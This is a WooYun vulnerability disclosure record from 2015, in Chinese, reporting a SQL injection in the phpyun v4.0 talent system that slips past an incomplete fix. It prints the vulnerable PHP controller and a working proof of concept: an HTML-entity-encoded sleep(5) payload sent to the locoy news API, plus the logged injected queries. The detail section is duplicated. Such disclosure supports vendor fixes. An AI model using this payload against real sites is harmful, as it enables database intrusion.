{"id": 84555, "wybug_id": "wooyun-2015-0144377", "wybug_title": "phpyun最新版无视GPC注入(修复错误）", "wybug_corp": "php云人才系统", "wybug_author": "Xser", "wybug_date": "2015-10-11 15:11", "wybug_open_date": "2016-01-11 15:32", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-16：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-12-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-11：\t细节向公众公开  简要描述： PHP云人才系统 phpyun v4.0正式版 build20150819修复位置修复错了 详细说明：  出现在api/locoy/model/news.class.php\nclass news_controller extends common{\tfunction addnews_action(){//新闻添加\t\tinclude(\"locoy_config.php\");\t\tif($locoyinfo['locoy_online']!=1){\t\t\techo 4;die;\t\t}\t\tif($locoyinfo['locoy_key']!=trim($_GET['key'])){\t\t\techo 5;die;\t\t}        if(!$_POST['title'] || !$_POST['content'] || !$_POST['nid']){\t\t\techo 2;die;\t\t}\t\t$row=$this->obj->DB_select_once(\"news_base\",\"`title`='\".trim($_POST['title']).\"' and `nid`='\".$_POST['nid'].\"'\");\t\tif(is_array($row)){\t\t\techo 3;die;\t\t}\t\t$content=$_POST['content'];\t\t\t\t$value=\"\";        $value.=\"`title`='\".trim($_POST['title']).\"',\";\t\t$value.=\"`nid`='\".$_POST['nid'].\"',\";\t\t$value.=\"`did`='0',\";\t\t$value.=\"`author`='\".$_POST['author'].\"',\";\t\t$description=mb_substr(strip_tags(html_entity_decode($content,ENT_NOQUOTES,\"GB2312\")),0,180,\"gbk\");\t\t$description=$_POST['description']?$_POST['description']:$description;\t\t$description=str_replace(array(' ',\"\\n\",\"\\r\",\"\\r\\n\",\" \"),array(''),$description);\t\t$value.=\"`description`='\".$description.\"',\";\t\t$value.=\"`source`='\".$_POST['source'].\"'\";\t\tif($_POST['ctime']){\t\t\t$value.=\",`datetime`='\".strtotime($_POST['ctime']).\"'\";\t\t}else{\t\t\t$value.=\",`datetime`='\".time().\"'\";\t\t}\t\tif($_POST['hits']){\t\t\t$value.=\",`hits`='\".trim($_POST['hits']).\"'\";\t\t}else{\t\t\t$row=explode('-',$locoyinfo['locoy_rand']);\t\t\tif(is_array($row)){\t\t\t\t$rand=rand(trim($row[0]),trim($row[1]));\t\t\t}else{\t\t\t\t$rand=!trim($row)?0:$row;\t\t\t}\t\t\t$value.=\",`hits`='\".$rand.\"'\";\t\t}\t\tif($_POST['sort']){\t\t\t$value.=\",`sort`='\".trim($_POST['sort']).\"'\";\t\t}else{\t\t\t$row=explode('-',$locoyinfo['locoy_sort']);\t\t\tif(is_array($row)){\t\t\t\t$rand=rand(trim($row[0]),trim($row[1]));\t\t\t}else{\t\t\t\t$rand=!trim($row)?0:$row;\t\t\t}\t\t\t$value.=\",`sort`='\".$rand.\"'\";\t\t}\t\tif($_POST['newsphoto']){\t\t\t$value.=\",`newsphoto`='\".trim($_POST['newsphoto']).\"'\";\t\t}\t\tif($_POST['s_thumb']){\t\t\t$value.=\",`s_thumb`='\".trim($_POST['s_thumb']).\"'\";\t\t}       if(!$_POST['keyword'] && $locoyinfo['locoy_keyword']==1){\t\t\trequire(LIB_PATH.\"lib_splitword_class.php\");\t\t\t$sp = new SplitWord();\t\t\t$keywordarr=$sp->getkeyword(strip_tags(html_entity_decode($content)));\t\t\t$value.=\",`keyword`='\".strip_tags(@implode(\",\",$keywordarr)).\"'\";\t\t}elseif($_POST['keyword']){\t\t\t$value.=\",`keyword`='\".str_replace(\"，\",\",\",$_POST['keyword']).\"'\";\t\t}     \t$new_base = $this->obj->DB_insert_once(\"news_base\",$value);        $news_content = $this->obj->DB_insert_once(\"news_content\", \"`nbid`='$new_base',`content`='$content'\");\t\tif($new_base){\t\t\techo 1;die;\t\t}else{\t\t\techo 0;die;\t\t\t}\t}}?>\n\n$description=mb_substr(strip_tags(html_entity_decode($content,ENT_NOQUOTES,\"GB2312\")),0,180,\"gbk\");\t\t$description=$_POST['description']?$_POST['description']:$description;\t\t$description=str_replace(array(' ',\"\\n\",\"\\r\",\"\\r\\n\",\" \"),array(''),$description);\n这里没有修复好再次测试一下\n这样发送url:http://localhost/phpyun40/upload/api/locoy/index.php?m=news&c=addnews&key=phpyunpostdata:title=xxxx&content=%26%2349%3B%26%2339%3B%26%2342%3B%26%23115%3B%26%23108%3B%26%23101%3B%26%23101%3B%26%2332%3B%26%23112%3B%26%2340%3B%26%2353%3B%26%2341%3B%26%2335%3B&nid=567&keyword=xxxxxx\n\n\n可以看到还是存在的\n2015/10/1 11:45\tINSERT INTO `phpyun_news_base` SET `title`='xxxx',`nid`='567',`did`='0',`author`='',`description`='1'*sleep(5)#',`source`='',`datetime`='1443671113',`hits`='',`sort`='',`keyword`='xxxxxx'\n\n2015/10/1 11:45\tINSERT INTO `phpyun_news_content` SET `nbid`='1',`content`='1'*slee&#32;p(5)#'\n可这里却被过滤了我看是开发者修复错位了吧。。。。导致还是存在注入   漏洞证明：  出现在api/locoy/model/news.class.php\nclass news_controller extends common{\tfunction addnews_action(){//新闻添加\t\tinclude(\"locoy_config.php\");\t\tif($locoyinfo['locoy_online']!=1){\t\t\techo 4;die;\t\t}\t\tif($locoyinfo['locoy_key']!=trim($_GET['key'])){\t\t\techo 5;die;\t\t}        if(!$_POST['title'] || !$_POST['content'] || !$_POST['nid']){\t\t\techo 2;die;\t\t}\t\t$row=$this->obj->DB_select_once(\"news_base\",\"`title`='\".trim($_POST['title']).\"' and `nid`='\".$_POST['nid'].\"'\");\t\tif(is_array($row)){\t\t\techo 3;die;\t\t}\t\t$content=$_POST['content'];\t\t\t\t$value=\"\";        $value.=\"`title`='\".trim($_POST['title']).\"',\";\t\t$value.=\"`nid`='\".$_POST['nid'].\"',\";\t\t$value.=\"`did`='0',\";\t\t$value.=\"`author`='\".$_POST['author'].\"',\";\t\t$description=mb_substr(strip_tags(html_entity_decode($content,ENT_NOQUOTES,\"GB2312\")),0,180,\"gbk\");\t\t$description=$_POST['description']?$_POST['description']:$description;\t\t$description=str_replace(array(' ',\"\\n\",\"\\r\",\"\\r\\n\",\" \"),array(''),$description);\t\t$value.=\"`description`='\".$description.\"',\";\t\t$value.=\"`source`='\".$_POST['source'].\"'\";\t\tif($_POST['ctime']){\t\t\t$value.=\",`datetime`='\".strtotime($_POST['ctime']).\"'\";\t\t}else{\t\t\t$value.=\",`datetime`='\".time().\"'\";\t\t}\t\tif($_POST['hits']){\t\t\t$value.=\",`hits`='\".trim($_POST['hits']).\"'\";\t\t}else{\t\t\t$row=explode('-',$locoyinfo['locoy_rand']);\t\t\tif(is_array($row)){\t\t\t\t$rand=rand(trim($row[0]),trim($row[1]));\t\t\t}else{\t\t\t\t$rand=!trim($row)?0:$row;\t\t\t}\t\t\t$value.=\",`hits`='\".$rand.\"'\";\t\t}\t\tif($_POST['sort']){\t\t\t$value.=\",`sort`='\".trim($_POST['sort']).\"'\";\t\t}else{\t\t\t$row=explode('-',$locoyinfo['locoy_sort']);\t\t\tif(is_array($row)){\t\t\t\t$rand=rand(trim($row[0]),trim($row[1]));\t\t\t}else{\t\t\t\t$rand=!trim($row)?0:$row;\t\t\t}\t\t\t$value.=\",`sort`='\".$rand.\"'\";\t\t}\t\tif($_POST['newsphoto']){\t\t\t$value.=\",`newsphoto`='\".trim($_POST['newsphoto']).\"'\";\t\t}\t\tif($_POST['s_thumb']){\t\t\t$value.=\",`s_thumb`='\".trim($_POST['s_thumb']).\"'\";\t\t}       if(!$_POST['keyword'] && $locoyinfo['locoy_keyword']==1){\t\t\trequire(LIB_PATH.\"lib_splitword_class.php\");\t\t\t$sp = new SplitWord();\t\t\t$keywordarr=$sp->getkeyword(strip_tags(html_entity_decode($content)));\t\t\t$value.=\",`keyword`='\".strip_tags(@implode(\",\",$keywordarr)).\"'\";\t\t}elseif($_POST['keyword']){\t\t\t$value.=\",`keyword`='\".str_replace(\"，\",\",\",$_POST['keyword']).\"'\";\t\t}     \t$new_base = $this->obj->DB_insert_once(\"news_base\",$value);        $news_content = $this->obj->DB_insert_once(\"news_content\", \"`nbid`='$new_base',`content`='$content'\");\t\tif($new_base){\t\t\techo 1;die;\t\t}else{\t\t\techo 0;die;\t\t\t}\t}}?>\n\n$description=mb_substr(strip_tags(html_entity_decode($content,ENT_NOQUOTES,\"GB2312\")),0,180,\"gbk\");\t\t$description=$_POST['description']?$_POST['description']:$description;\t\t$description=str_replace(array(' ',\"\\n\",\"\\r\",\"\\r\\n\",\" \"),array(''),$description);\n这里没有修复好再次测试一下\n这样发送url:http://localhost/phpyun40/upload/api/locoy/index.php?m=news&c=addnews&key=phpyunpostdata:title=xxxx&content=%26%2349%3B%26%2339%3B%26%2342%3B%26%23115%3B%26%23108%3B%26%23101%3B%26%23101%3B%26%2332%3B%26%23112%3B%26%2340%3B%26%2353%3B%26%2341%3B%26%2335%3B&nid=567&keyword=xxxxxx\n\n\n可以看到还是存在的\n2015/10/1 11:45\tINSERT INTO `phpyun_news_base` SET `title`='xxxx',`nid`='567',`did`='0',`author`='',`description`='1'*sleep(5)#',`source`='',`datetime`='1443671113',`hits`='',`sort`='',`keyword`='xxxxxx'\n\n2015/10/1 11:45\tINSERT INTO `phpyun_news_content` SET `nbid`='1',`content`='1'*slee&#32;p(5)#'\n可这里却被过滤了我看是开发者修复错位了吧。。。。导致还是存在注入   修复方案：     版权声明：转载请注明来源 Xser@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2015-10-13 11:20 厂商回复： 感谢提供！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}